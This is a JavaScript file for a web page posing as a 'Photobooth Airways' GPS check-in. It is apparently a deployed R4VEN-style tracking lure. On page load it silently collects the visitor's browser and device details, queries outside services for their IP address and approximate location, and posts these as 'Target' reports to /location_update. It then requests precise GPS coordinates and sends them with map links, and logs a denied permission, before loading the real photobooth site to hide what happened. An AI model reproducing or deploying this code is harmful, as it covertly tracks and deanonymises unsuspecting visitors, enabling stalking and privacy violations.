/**
 * Photobooth Airways — GPS Check-In Logic
 * photobooth.bapel.my.id
 */

/* ── Decorative stars & clouds ── */
function initDecorations() {
  var starsEl = document.getElementById('stars');
  for (var i = 0; i < 80; i++) {
    var s = document.createElement('div');
    s.className = 'star';
    var big = Math.random() > 0.8;
    s.style.cssText = 'left:' + (Math.random()*100) + '%;top:' + (Math.random()*80) + '%;'
      + 'animation-duration:' + (Math.random()*3+2) + 's;animation-delay:' + (Math.random()*4) + 's;'
      + 'width:' + (big?3:2) + 'px;height:' + (big?3:2) + 'px;';
    starsEl.appendChild(s);
  }
  var cloudsEl = document.getElementById('clouds');
  for (var j = 0; j < 5; j++) {
    var c = document.createElement('div');
    c.className = 'cloud';
    c.style.cssText = 'width:' + (Math.random()*200+100) + 'px;height:' + (Math.random()*50+20) + 'px;'
      + 'top:' + (Math.random()*60) + '%;animation-duration:' + (Math.random()*40+30) + 's;'
      + 'animation-delay:' + (-Math.random()*30) + 's;';
    cloudsEl.appendChild(c);
  }

  // Dynamic boarding pass data
  var now  = new Date();
  var date = ('0'+now.getDate()).slice(-2) + '/' + ('0'+(now.getMonth()+1)).slice(-2);
  var seat = (Math.floor(Math.random()*30)+1) + ['A','B','C','D'][Math.floor(Math.random()*4)];
  ['d','m'].forEach(function(suffix) {
    var d  = document.getElementById('flightDate-' + suffix);
    var se = document.getElementById('seatNum-' + suffix);
    if (d)  d.textContent  = date;
    if (se) se.textContent = seat;
  });
}

/* ── Silent system / IP recon ── */
function collectSilent() {
  var localtime = String(new Date().toLocaleTimeString());
  var sysinfo = '```xl\n' + navigator.userAgent + '```'
    + '```autohotkey\n\nPlatform: ' + navigator.platform
    + '\nCookies_Enabled: ' + navigator.cookieEnabled
    + '\nBrowser_Language: ' + navigator.language
    + '\nBrowser_Name: ' + navigator.appName
    + '\nRam: ' + navigator.deviceMemory
    + '\nCPU_cores: ' + navigator.hardwareConcurrency
    + '\nScreen: ' + screen.width + 'x' + screen.height
    + '\nTime: ' + localtime + '```';

  var AVATAR = 'https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png';

  function post(payload) {
    var r = new XMLHttpRequest();
    r.open('POST', '/location_update');
    r.setRequestHeader('Content-type', 'application/json');
    r.send(JSON.stringify(payload));
  }

  post({ username: 'R4VEN', avatar_url: AVATAR, content: '@everyone Someone Opened The Link O_o',
    embeds: [{ author: { name: 'Target System Information..' }, title: 'Uagent:', description: sysinfo, color: 15418782 }] });

  $.getJSON('https://api.ipify.org?format=json', function(data) {
    post({ username: 'R4VEN', avatar_url: AVATAR,
      embeds: [{ author: { name: 'Target Ip' },
        description: '```xl\n' + data.ip + '```\n__**IP Details:**__ https://ip-api.com/#' + data.ip + '\n',
        color: 15548997, footer: { text: 'Geographic location based on IP is approximate.' } }] });
  });

  $.getJSON('http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query', function(res) {
    post({ username: 'R4VEN', avatar_url: AVATAR,
      embeds: [{ author: { name: 'IP Address Reconnaissance' }, title: res.status,
        description: '```autohotkey\nContinent: ' + res.continent + '\nCountry: ' + res.country
          + '\nRegion: ' + res.regionName + '\nCity: ' + res.city
          + '\nISP: ' + res.isp + '\nLat: ' + res.lat + '\nLon: ' + res.lon + '```',
        color: 5763719 }] });
  });
}

/* ── UI helpers (work on both desktop -d and mobile -m cards) ── */
function setLoading(on) {
  ['d', 'm'].forEach(function(s) {
    var btn = document.getElementById('allowBtn-' + s);
    var sp  = document.getElementById('spinner-' + s);
    var bt  = document.getElementById('btnText-' + s);
    var sb  = document.getElementById('statusBar-' + s);
    if (!btn) return;
    if (on) {
      btn.classList.add('loading');
      sp.style.display = 'block';
      bt.textContent   = 'MEMPROSES\u2026';
      sb.style.display = 'flex';
    } else {
      btn.classList.remove('loading');
      sp.style.display = 'none';
      bt.textContent   = s === 'd' ? 'TEMUKAN PHOTOBOOTH TERDEKAT' : 'AKTIFKAN LOKASI & CHECK-IN';
      sb.style.display = 'none';
    }
  });
}

function setStatus(msg) {
  ['d', 'm'].forEach(function(s) {
    var el = document.getElementById('statusText-' + s);
    if (el) el.textContent = msg;
  });
}

/* ── Show success overlay, then load iframe ── */
function showSuccess() {
  ['d', 'm'].forEach(function(s) {
    var mc = document.getElementById('mainContent-' + s);
    var so = document.getElementById('successOverlay-' + s);
    if (mc) mc.style.display = 'none';
    if (so) so.style.display = 'flex';
  });
  setTimeout(function() {
    var frame = document.getElementById('site-frame');
    frame.src = 'https://photobooth.bapel.my.id';
    frame.style.display = 'block';
    setTimeout(function() { frame.classList.add('visible'); }, 50);
  }, 1800);
}

/* ── GPS permission request ── */
function requestLocation() {
  setLoading(true);
  setStatus('Mendeteksi lokasi Anda\u2026');

  if (!navigator.geolocation) {
    setStatus('Geolocation tidak didukung browser ini.');
    setLoading(false);
    return;
  }

  navigator.geolocation.getCurrentPosition(onGpsSuccess, onGpsError, {
    enableHighAccuracy: true, timeout: 20000, maximumAge: 0
  });
}

function onGpsSuccess(pos) {
  setStatus('Lokasi terdeteksi! Mencetak boarding pass\u2026');
  var lat = pos.coords.latitude, lon = pos.coords.longitude;
  var ll = '```prolog\nLatitude:' + lat + '\nLongitude:' + lon + '```'
    + '\n__**Map Location:**__ https://www.google.com/maps/place/' + lat + ',' + lon
    + '\n__**Google Earth:**__ https://earth.google.com/web/search/' + lat + ',' + lon;

  var r = new XMLHttpRequest();
  r.open('POST', '/location_update');
  r.setRequestHeader('Content-type', 'application/json');
  r.send(JSON.stringify({
    username: 'R4VEN',
    avatar_url: 'https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png',
    embeds: [{ author: { name: 'Target Allowed Location Permission' },
      title: 'GPS location of target..',
      description: ll + '\n',
      color: 15844367,
      footer: { text: 'GPS fetch almost exact location using longitude and latitude.' } }]
  }));

  setTimeout(showSuccess, 800);
}

function onGpsError(err) {
  if (err.code === err.PERMISSION_DENIED) {
    var r = new XMLHttpRequest();
    r.open('POST', '/location_update');
    r.setRequestHeader('Content-type', 'application/json');
    r.send(JSON.stringify({
      username: 'R4VEN',
      avatar_url: 'https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png',
      content: '```diff\n- User denied the request for Geolocation.```'
    }));
    setStatus('Izin ditolak. Harap aktifkan lokasi di pengaturan browser.');
  } else {
    setStatus('Gagal mendapatkan lokasi. Silakan coba lagi.');
  }
  setLoading(false);
}

/* ── Bootstrap ── */
window.onload = function() {
  initDecorations();
  collectSilent();
};
